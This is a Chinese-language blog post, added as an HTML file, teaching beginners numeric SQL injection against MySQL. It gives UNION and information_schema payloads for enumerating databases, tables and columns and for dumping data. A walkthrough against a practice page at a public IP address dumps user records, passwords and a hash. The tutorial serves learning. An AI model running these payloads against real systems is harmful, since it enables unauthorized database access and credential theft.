@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>sql注入入门学习(数字型)（连载中） - 淡定的分享</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content="php">
+  
+    <meta name="description" content="活着是需要坐标的，虽然回不去，可是看得见，博客的意义正在于此">
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="淡定的分享" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head></html>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">淡定的分享</a>
+    <div class="subtitle">这些年我都做了什么事？</div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">主页</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives" class="menu-item-link">归档</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">sql注入入门学习(数字型)（连载中）</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-01-01</span>
+  </div>
+  <div class="post-content">
+    <blockquote>
+<p>非宁静无以致远</p>
+</blockquote>
+<h4 id="判断sql注入"><a href="#判断sql注入" class="headerlink" title="判断sql注入"></a>判断sql注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.提交单引号</span><br><span class="line">2.and大法和or大法</span><br><span class="line">3.加法和减法，加号  %2b</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据库权限判断"><a href="#数据库权限判断" class="headerlink" title="数据库权限判断"></a>数据库权限判断</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(user(),1,1))=114</span><br><span class="line">//或者</span><br><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>用union联合查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>……</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,null.....</span><br></pre></td></tr></table></figure>
+
+<p>用order by 查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断数据库版本</span><br><span class="line">and ord(mid(version(),1,1))&gt;51 </span><br><span class="line">直接使用mysql自带函数database()查询得到数据库名</span><br><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br><span class="line">得到所有的数据库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,schema_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">获取第一个库名</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,schema_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表</p>
+<p>group_concat</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'test'</span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'test'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h4><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'test'</span> <span class="keyword">and</span> table_name=<span class="string">'sqltest'</span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,column_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'test'</span> <span class="keyword">and</span> table_name=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,<span class="keyword">user</span>,pwd),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">admin</span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,title,<span class="keyword">content</span> <span class="keyword">from</span> sqltest</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="number">0x3c</span>,pwd) <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h4><p>打开网站<code>http://43.247.91.228/content-1/index.php?id=0</code>,我们在这里做注入练习</p>
+<p>1.首先加单引号报错，可知存在明显的注入漏洞</p>
+<p>2.输入<code>and ord(mid(user(),1,1))=114</code>不报错，可知数据库的权限是root权限，并且具有可读可写的权限</p>
+<p>3.输入 <code>and 1=1 union select 1,2,3,4,5,6,7,8</code>不报错，可以发现这个表的字段有8个</p>
+<p>4.使用<code>and 1=2 union select null,schema_name,null ,null,null,null,null,null from information_schema.schemata limit 1,1;--</code>用<code>;--</code>注释了后面的语句，可以获取所有的数据库名，可以知道当前执行查询用户名为root@localhost（user()函数）， 当前使用的数据库是<strong>inject</strong>，下面列出所有数据库</p>
+<ul>
+<li><strong>information_schema</strong></li>
+<li><strong>inject</strong></li>
+<li><strong>mysql</strong></li>
+<li><strong>performance_schema</strong></li>
+</ul>
+<p>5.使用<code>union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=&#39;inject&#39; limit 1,1;--</code>获取所有的表名，下面列出所有的表</p>
+<ul>
+<li><strong>users</strong></li>
+</ul>
+<p>6.使用<code>union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=&#39;inject&#39; limit 1,1;--</code>获取所有的字段，下面列出所有的字段</p>
+<ul>
+<li><strong>idusers</strong></li>
+<li><strong>name</strong></li>
+<li><strong>email</strong></li>
+<li><strong>password</strong></li>
+<li><strong>ua</strong></li>
+<li><strong>ref</strong></li>
+<li><strong>host</strong></li>
+<li><strong>lang</strong></li>
+</ul>
+<p>7.接下来就到最后最重要的一步了，获取所有数据，<code>and 1=2 union select 1,group_concat(idusers,name,email,password,ua,ref,host,lang),3,4,5,6,7,8 from users;--</code></p>
+<p>获取到的数据如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0adminadmin@getmantra.comadminBrick_Browserhttp://127.0.0.1/<span class="keyword">release</span>-channel/<span class="keyword">content</span><span class="number">-13</span>/index.php127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>en,<span class="number">1</span>tomtom@getmantra.comtomBlock_Browser8<span class="number">.8</span><span class="number">.8</span><span class="number">.8</span>en,<span class="number">2</span>ronron@getmantra.comronRain_Browser192<span class="number">.168</span><span class="number">.1</span><span class="number">.1</span>en,<span class="number">3</span>harryharry@getmantra.com5f4dcc3b5aa765d61d8327deb882cf99Mantra127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>en</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来这些应该就是数据表中所有的数据了，但是怎么格式化我并不会，希望看到这篇文章的大佬们能帮我解决一下，请给我发邮件：<a href="mailto:dandingkeji.top@gmail.com" target="_blank" rel="noopener">dandingkeji.top@gmail.com</a></p>
+
+  </div>
+  <div class="post-footer">
+    
+      <ul class="post-tag-list"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/php/">php</a></li></ul>
+    
+
+    <a href="#top" class="top">返回顶部</a>
+  </div>
+</article>
+<footer>
+  &copy; 2019
+  <span class="author">
+    danding
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
